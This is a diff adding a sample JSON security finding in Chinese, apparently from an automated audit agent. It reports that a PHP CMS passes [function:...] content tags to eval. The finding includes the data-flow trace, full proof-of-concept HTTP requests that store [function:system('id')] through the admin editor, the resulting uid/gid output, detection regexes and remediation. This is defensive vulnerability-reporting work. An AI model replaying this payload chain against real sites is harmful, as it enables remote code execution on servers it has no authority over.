@@ -1,0 +1,289 @@
+{
+  "vuln_id": "FINDING-001",
+  "title": "页面内容标签可触发 PHP eval 执行",
+  "vuln_type": "代码执行",
+  "category": "injection",
+  "x_category_label": "注入类",
+  "x_signature_type": "cmd-exec",
+  "x_unique_marker": "VIBECSA-FINDING001",
+  "x_example_note": "这是执行 verify_vuln.py 后的结构样例，目标、Cookie、响应均为示例数据；不要当作真实目标验证结果。",
+  "cwe": "CWE-94",
+  "severity": "high",
+  "confidence": "high",
+  "dktss_score": 7.6,
+  "description": "前台内容渲染会在 content_functions 开关启用时，对文本中的 [function:...] 标签执行 preg_replace_callback，并在回调 content_function 中将标签内容拼接为 eval('return ...;')。",
+  "impact": "攻击者可借助内容编辑入口写入恶意 [function:...] 标签，在页面渲染时执行 PHP 表达式或系统命令。",
+  "location": {
+    "file": "cms/includes/functions.inc.php",
+    "line_start": 297,
+    "line_end": 297,
+    "function": "content_function",
+    "route": "/admin.php?mode=edit&id=42 then /page/test-rce",
+    "http_method": "POST then GET",
+    "snippet": "return @eval('return '.$function[1].';');"
+  },
+  "analysis": {
+    "source": {
+      "description": "后台编辑页面可将 content 字段写入数据库，前台渲染时进入 parse_special_tags。",
+      "location": "cms/includes/edit.inc.php:440-449",
+      "user_controlled": true,
+      "parameters": ["content", "content_functions"]
+    },
+    "sink": {
+      "description": "parse_special_tags 匹配 [function:...] 后调用 content_function，最终进入 eval。",
+      "location": "cms/includes/functions.inc.php:500-504,295-297",
+      "sink_type": "代码执行",
+      "dangerous_api": "eval"
+    },
+    "data_flow": [
+      {
+        "step": 1,
+        "type": "source",
+        "location": "cms/includes/edit.inc.php:441-445",
+        "desc": "后台页面保存逻辑将 $_POST['content'] 写入数据库。",
+        "code": "$dbr->bindParam(20, $_POST['content'], PDO::PARAM_STR);"
+      },
+      {
+        "step": 2,
+        "type": "propagation",
+        "location": "cms/includes/content.inc.php:53-76",
+        "desc": "前台页面从数据库取出 content 并交给 parse_special_tags。",
+        "code": "$content = parse_special_tags($content);"
+      },
+      {
+        "step": 3,
+        "type": "sink",
+        "location": "cms/includes/functions.inc.php:297",
+        "desc": "标签内容被拼接进 eval 执行。",
+        "code": "return @eval('return '.$function[1].';');"
+      }
+    ],
+    "attack_surface": {
+      "entrypoint": "后台页面编辑与前台内容渲染",
+      "http_method": "POST then GET",
+      "route": "/admin.php?mode=edit&id=42 then /page/test-rce",
+      "parameters": ["content", "content_functions"],
+      "auth_required": true,
+      "required_role": "page editor",
+      "content_type": "application/x-www-form-urlencoded"
+    },
+    "preconditions": [
+      "content_functions 配置项启用。",
+      "测试账号具备页面编辑权限。",
+      "目标为授权测试环境。"
+    ],
+    "security_controls": [
+      {
+        "control": "编辑权限",
+        "location": "admin.php:58-63",
+        "assessment": "present_effective",
+        "bypass_notes": "动态验证使用已授权 page editor 测试账号。"
+      }
+    ],
+    "bypass_strategy": {
+      "feasible": true,
+      "difficulty": "medium",
+      "ideas": [
+        {
+          "technique": "先用无破坏表达式确认 eval，再用命令输出确认 RCE",
+          "payload_hint": "[function:system('id')]",
+          "reason": "响应中出现 uid/gid 可作为 L3 命令执行证据。"
+        }
+      ]
+    },
+    "verification_plan": {
+      "objective": "证明 [function:...] 标签内容在页面渲染时被 PHP eval 执行。",
+      "steps": [
+        {
+          "step": 1,
+          "action": "使用编辑权限保存测试页面内容为 [function:system('id')]。",
+          "expected_signal": "页面保存成功并返回 302 到测试页面。"
+        },
+        {
+          "step": 2,
+          "action": "访问测试页面。",
+          "expected_signal": "响应体出现 uid/gid 命令输出。"
+        }
+      ],
+      "success_criteria": [
+        "响应体命中 cmd-exec L3 签名。",
+        "poc.steps[].request.raw 和 response.raw 均由 verify_vuln.py 写入。"
+      ]
+    }
+  },
+  "static_evidence": {
+    "agent": "Agent-Injection",
+    "confidence_reason": "从内容字段写入、前台读取、特殊标签解析到 eval 的链路明确。",
+    "evidence_refs": {
+      "EVID_EDIT_WRITE": "cms/includes/edit.inc.php:440-449",
+      "EVID_RENDER": "cms/includes/content.inc.php:53-76",
+      "EVID_EVAL": "cms/includes/functions.inc.php:295-297"
+    },
+    "reviewed_files": [
+      {
+        "file": "cms/includes/edit.inc.php",
+        "role": "source",
+        "summary": "确认 content 字段可写入。"
+      },
+      {
+        "file": "cms/includes/functions.inc.php",
+        "role": "sink",
+        "summary": "确认 content_function 使用 eval。"
+      }
+    ],
+    "anti_false_positive": {
+      "checked": [
+        "确认 eval 位于运行时代码路径。",
+        "确认动态验证使用已授权测试账号。"
+      ],
+      "notes": "动态验证响应命中 uid/gid 签名。"
+    }
+  },
+  "dynamic_verification": {
+    "state": "verified",
+    "attempts": [
+      {
+        "attempt": 1,
+        "payload_strategy": "使用已授权编辑账号保存 [function:system('id')] 到测试页面 content 字段。",
+        "request_ref": "poc.steps[1].request",
+        "response_ref": "poc.steps[1].response",
+        "result": "success",
+        "evidence_snippet": "HTTP 302 保存成功并跳转到 /page/test-rce。",
+        "next_action": "访问测试页面触发渲染。"
+      },
+      {
+        "attempt": 2,
+        "payload_strategy": "访问测试页面触发 parse_special_tags -> content_function -> eval。",
+        "request_ref": "poc.steps[2].request",
+        "response_ref": "poc.steps[2].response",
+        "result": "success",
+        "evidence_snippet": "uid=33(www-data) gid=33(www-data) groups=33(www-data)",
+        "next_action": "可生成最终报告。"
+      }
+    ],
+    "final_evidence": {
+      "proof_type": "command_output",
+      "summary": "step 2 response.body 命中 cmd-exec: \"uid=33(www-data) gid=33(www-data)\", proof_type=command_output",
+      "snippets": [
+        {
+          "step": 2,
+          "source": "response._evidence_match",
+          "response_field": "response.body",
+          "snippet": "uid=33(www-data) gid=33(www-data)",
+          "signature_type": "cmd-exec",
+          "strength": "L3"
+        }
+      ]
+    },
+    "runtime_notes": "verify_vuln.py 已发送最终两步请求并写回完整 request/response。"
+  },
+  "poc": {
+    "steps": [
+      {
+        "step": 1,
+        "name": "保存带命令执行 payload 的测试页面",
+        "request": {
+          "method": "POST",
+          "url": "/admin.php?mode=edit&id=42",
+          "headers": {
+            "User-Agent": "vibe-csa/3.0",
+            "Accept": "*/*",
+            "Content-Type": "application/x-www-form-urlencoded"
+          },
+          "params": {},
+          "body": {
+            "title": "vibe-csa-test-rce",
+            "content_functions": "1",
+            "content": "[function:system('id')]",
+            "save": "1"
+          },
+          "cookies": {
+            "PHPSESSID": "<redacted-session-cookie>"
+          },
+          "raw": "POST /admin.php?mode=edit&id=42 HTTP/1.1\r\nHost: target.example.test\r\nUser-Agent: vibe-csa/3.0\r\nAccept: */*\r\nContent-Type: application/x-www-form-urlencoded\r\nCookie: PHPSESSID=<redacted-session-cookie>\r\n\r\ntitle=vibe-csa-test-rce&content_functions=1&content=%5Bfunction%3Asystem%28%27id%27%29%5D&save=1"
+        },
+        "response": {
+          "status": 302,
+          "headers": {
+            "Location": "/page/test-rce",
+            "Content-Type": "text/html; charset=UTF-8",
+            "Set-Cookie": "PHPSESSID=<redacted-session-cookie>; path=/; HttpOnly"
+          },
+          "raw": "HTTP/1.1 302 Found\r\nLocation: /page/test-rce\r\nContent-Type: text/html; charset=UTF-8\r\nSet-Cookie: PHPSESSID=<redacted-session-cookie>; path=/; HttpOnly\r\n\r\n",
+          "body": "",
+          "redirect_chain": [
+            {
+              "url": "https://target.example.test/admin.php?mode=edit&id=42",
+              "status": 302
+            }
+          ],
+          "_meta": {
+            "elapsed_ms": 118.4
+          }
+        }
+      },
+      {
+        "step": 2,
+        "name": "访问测试页面触发 [function:system('id')]",
+        "request": {
+          "method": "GET",
+          "url": "/page/test-rce",
+          "headers": {
+            "User-Agent": "vibe-csa/3.0",
+            "Accept": "*/*"
+          },
+          "params": {},
+          "body": "",
+          "cookies": {},
+          "raw": "GET /page/test-rce HTTP/1.1\r\nHost: target.example.test\r\nUser-Agent: vibe-csa/3.0\r\nAccept: */*\r\n\r\n"
+        },
+        "response": {
+          "status": 200,
+          "headers": {
+            "Content-Type": "text/html; charset=UTF-8",
+            "Content-Length": "187"
+          },
+          "raw": "HTTP/1.1 200 OK\r\nContent-Type: text/html; charset=UTF-8\r\nContent-Length: 187\r\n\r\n<html><body><h1>vibe-csa-test-rce</h1><div class=\"content\">uid=33(www-data) gid=33(www-data) groups=33(www-data)</div></body></html>",
+          "body": "<html><body><h1>vibe-csa-test-rce</h1><div class=\"content\">uid=33(www-data) gid=33(www-data) groups=33(www-data)</div></body></html>",
+          "_meta": {
+            "elapsed_ms": 86.7,
+            "evidence_strength": "L3"
+          },
+          "_evidence_match": [
+            {
+              "type": "cmd-exec",
+              "pattern": "uid=\\d+\\([^)]+\\)\\s+gid=\\d+\\([^)]+\\)",
+              "strength": "L3",
+              "snippet": "uid=33(www-data) gid=33(www-data)",
+              "offset": 61
+            },
+            {
+              "type": "cmd-exec",
+              "pattern": "groups=\\d+\\([^)]+\\)(,\\d+\\([^)]+\\))*",
+              "strength": "L3",
+              "snippet": "groups=33(www-data)",
+              "offset": 88
+            }
+          ]
+        }
+      }
+    ],
+    "result": "success",
+    "evidence": "step 2 response.body 命中 cmd-exec: \"uid=33(www-data) gid=33(www-data)\", proof_type=command_output",
+    "failure_log": []
+  },
+  "remediation": {
+    "short_term": "移除 content_function 中的 eval，或仅允许固定白名单短代码函数；默认关闭 content_functions。",
+    "long_term": "将内容扩展能力改为受控短代码系统，不允许用户内容直接表达 PHP 代码。"
+  },
+  "fix": {
+    "language": "php",
+    "before": "return @eval('return '.$function[1].';');",
+    "after": "删除 eval；改用短代码名称到安全回调函数的白名单映射，并对参数做类型校验。"
+  },
+  "status": "CONFIRMED",
+  "evidence_level": "L3",
+  "finding_class": "runtime_verified",
+  "x_finding_class": "runtime_verified",
+  "tracking_completeness": "FULL"
+}
